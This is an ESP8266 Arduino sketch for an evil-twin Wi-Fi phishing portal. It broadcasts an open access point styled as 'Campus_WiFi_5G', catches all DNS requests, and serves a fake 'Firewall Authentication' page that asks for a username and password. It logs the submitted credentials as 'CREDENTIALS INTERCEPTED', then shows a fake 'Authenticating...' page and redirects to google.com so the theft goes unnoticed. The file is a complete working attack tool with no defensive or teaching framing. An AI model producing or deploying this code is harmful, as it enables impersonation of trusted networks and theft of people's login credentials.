#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

const char* ssid = "Campus_WiFi_5G"; // Changed to look more official
const char* password = ""; 

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer server(80);

const char* logo_base64 = "data:image/png;base64,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"; // Your existing base64

void handleRoot() {
  server.setContentLength(CONTENT_LENGTH_UNKNOWN);
  server.send(200, "text/html", "");

  // 1. Header and Refined CSS (Muted colors and flexbox layout)
  server.sendContent(F("<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>"));
  server.sendContent(F("<style>"));
  server.sendContent(F("body { height: 100vh; font-family: Helvetica, Arial, sans-serif; color: #6a6a6a; margin: 0; display: flex; align-items: center; justify-content: center; background-color: #fff; }"));
  server.sendContent(F(".message-container { width: 90%; max-width: 450px; padding: 20px; text-align: left; }"));
  server.sendContent(F(".logo { display: block; margin: 0 auto 20px auto; max-width: 100%; height: auto; object-fit: contain; }"));
  server.sendContent(F("h1 { font-size: 24px; color: #333; margin-bottom: 10px; font-weight: 500; }"));
  server.sendContent(F("p { font-size: 14px; margin-bottom: 25px; }"));
  server.sendContent(F(".field { margin-bottom: 15px; display: flex; flex-direction: column; }"));
  server.sendContent(F("label { font-size: 13px; color: rgba(0,0,0,.5); margin-bottom: 5px; }"));
  server.sendContent(F("input { padding: 8px; border: 1px solid #a9a9a9; border-radius: 2px; font-size: 16px; width: 100%; box-sizing: border-box; }"));
  server.sendContent(F("button.primary { margin-top: 10px; padding: 10px 20px; color: #fff; background-color: rgb(47, 113, 178); border: 1px solid rgb(34, 103, 173); border-radius: 3px; cursor: pointer; font-size: 14px; width: 100px; }"));
  server.sendContent(F("</style><title>Firewall Authentication</title></head><body>"));

  // 2. Content Structure
  server.sendContent(F("<div class='message-container'>"));
  server.sendContent(F("<img class='logo' src='"));
  server.sendContent(logo_base64); 
  server.sendContent(F("'>"));
  
  server.sendContent(F("<h1>Authentication Required</h1>"));
  server.sendContent(F("<p>Please enter your username and password to continue.</p>"));
  
  server.sendContent(F("<form action='/login' method='POST'>"));
  server.sendContent(F("<div class='field'><label>Username</label><input name='username' type='text' required></div>"));
  server.sendContent(F("<div class='field'><label>Password</label><input name='password' type='password' required></div>"));
  server.sendContent(F("<button class='primary' type='submit'>Continue</button>"));
  server.sendContent(F("</form></div></body></html>"));

  server.sendContent("");
}

void handleLogin() {
  String user = server.arg("username");
  String pass = server.arg("password");

  Serial.println(F("\n[!] CREDENTIALS INTERCEPTED:"));
  Serial.println("User: " + user);
  Serial.println("Pass: " + pass);

  // Send a realistic processing page
  String s = F("<html><head><meta http-equiv='refresh' content='3;url=https://google.com'></head>");
  s += F("<body style='text-align:center;font-family:sans-serif;padding-top:50px;'>");
  s += F("<h2>Authenticating...</h2><p>Please wait while we verify your credentials.</p></body></html>");
  server.send(200, "text/html", s);
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid, password);
  dnsServer.start(DNS_PORT, "*", apIP);
  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.onNotFound(handleRoot);
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}